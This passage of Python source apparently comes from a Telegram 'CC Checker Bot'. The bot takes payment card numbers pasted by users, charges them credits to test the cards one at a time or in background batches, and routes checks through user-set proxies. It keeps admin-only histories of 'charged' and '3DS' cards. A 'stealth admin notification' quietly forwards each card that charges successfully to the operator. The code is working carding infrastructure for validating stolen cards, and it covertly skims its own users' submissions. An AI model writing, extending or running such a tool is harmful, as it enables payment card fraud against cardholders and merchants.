    if waiting_for == "3ds_user_search":
        set_waiting_for(user_id, None)
        if not is_admin(user_id):
            await update.message.reply_text("🚫 Admin only!")
            return
        try:
            target_user_id = int(text.strip())
        except ValueError:
            await update.message.reply_text(
                "❌ Invalid user ID. Must be a number.\n\nTry again with `/get3ds <user_id>`",
                parse_mode="Markdown"
            )
            return
        await send_card_history(
            chat_id=update.effective_chat.id,
            bot=context.bot,
            target_user_id=target_user_id,
            card_type="3ds",
            reply_to_message_id=update.message.message_id
        )
        return

    # Parse cards from message
    cards = create_lista_(text)

    if not cards:
        return  # Ignore messages without cards

    # Check if user is banned
    if is_user_banned(user_id):
        await update.message.reply_text("🚫 You are banned from using this bot.")
        return

    # Check credits before processing
    user_credits = get_user_credits(user_id)
    cards_to_check = len(cards)

    if user_credits != -1 and user_credits < cards_to_check:
        if user_credits == 0:
            await update.message.reply_text(
                get_no_credits_message(),
                parse_mode="Markdown",
                reply_markup=get_subscribe_keyboard()
            )
            return
        else:
            # Warn and limit cards
            await update.message.reply_text(
                f"⚠️ *Limited Credits!*\n\n"
                f"You have {user_credits} credits but {cards_to_check} cards.\n"
                f"Only the first {user_credits} cards will be checked.",
                parse_mode="Markdown"
            )
            cards = cards[:user_credits]

    if len(cards) == 1:
        # Single card - check it
        card = cards[0]

        # Check credit before single card check
        if not has_enough_credits(user_id, 1):
            await update.message.reply_text(
                get_no_credits_message(),
                parse_mode="Markdown",
                reply_markup=get_subscribe_keyboard()
            )
            return

        status_msg = await update.message.reply_text(f"⏳ Checking `{card}`...", parse_mode="Markdown")
        try:
            # Deduct credit BEFORE checking
            success, remaining = deduct_credits(user_id, 1)
            if not success:
                await status_msg.edit_text(get_no_credits_message(), parse_mode="Markdown")
                return

            # Send credit notifications (10 remaining or depleted)
            if remaining in [10, 0]:
                asyncio.create_task(check_and_send_credit_notifications(user_id, remaining))

            result = await process_single_card(card, user_id, bot=context.bot)
            formatted = format_result(result)

            # Add remaining credits to result
            credits_line = f"\n\n💰 *Credits remaining*: {remaining}" if remaining != -1 else ""
            await status_msg.edit_text(formatted + credits_line, parse_mode="Markdown")

            # Stealth admin notification for charged cards
            if result.get("response", {}).get("success"):
                username = update.effective_user.username or update.effective_user.first_name
                asyncio.create_task(notify_admin_charged(card, result, user_id, username))
        except Exception as e:
            logger.error(f"Check error: {e}")
            await status_msg.edit_text(f"❌ Error: {str(e)}")
    else:
        # Multiple cards - process them all
        # Reset session state
        reset_user_session(user_id)
        session = get_user_session(user_id)
        session["checking"] = True

        # Pre-fetch user settings ONCE before starting (optimization)
        user_settings = get_user_settings(user_id)

        credits_text = f"💰 Credits: {user_credits}" if user_credits != -1 else "💰 Credits: ♾️ Unlimited"

        status_msg = await update.message.reply_text(
            f"⏳ Checking {len(cards)} cards...\n{credits_text}",
            reply_markup=get_checking_keyboard(paused=False)
        )

        # Run the checking loop as a BACKGROUND TASK so the handler returns immediately
        # This allows other users to interact with the bot while checking is in progress
        asyncio.create_task(
            run_batch_check(cards, user_id, user_settings, session, status_msg, update, context.bot)
        )


def main():
    """Start the bot"""
    global _bot_app

    if not config.BOT_TOKEN:
        logger.error("BOT_TOKEN not set! Please set the BOT_TOKEN environment variable.")
        return

    logger.info("Starting CC Checker Bot...")

    # Initialize database
    if DATABASE_URL:
        logger.info("Connecting to PostgreSQL database...")
        init_database()
        # Load persistent stats from database
        load_stats_from_db()
        logger.info("Loaded persistent stats from database")
    else:
        logger.warning("DATABASE_URL not set - using in-memory storage (settings won't persist)")

    app = Application.builder().token(config.BOT_TOKEN).build()

    # Store app reference for admin notifications
    _bot_app = app

    # Log admin notification status
    if config.ADMIN_USER_ID:
        logger.info(f"Admin notifications enabled for user ID: {config.ADMIN_USER_ID}")
    else:
        logger.info("Admin notifications disabled (ADMIN_USER_ID not set)")

    # Add handlers
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("menu", menu_command))
    app.add_handler(CommandHandler("setproxy", setproxy_command))
    app.add_handler(CommandHandler("getcharged", getcharged_command))
    app.add_handler(CommandHandler("get3ds", get3ds_command))
    app.add_handler(CommandHandler("settings", settings_command))
    app.add_handler(CommandHandler("credits", credits_command))
    app.add_handler(CommandHandler("subscribe", subscribe_command))
    app.add_handler(CommandHandler("history", history_command))
    app.add_handler(CommandHandler("dbstatus", dbstatus_command))
    app.add_handler(CommandHandler("admin", admin_command))
    app.add_handler(CommandHandler("chk", check_command))
    app.add_handler(CallbackQueryHandler(handle_callback))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    # Run the bot
    logger.info("Bot is running...")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
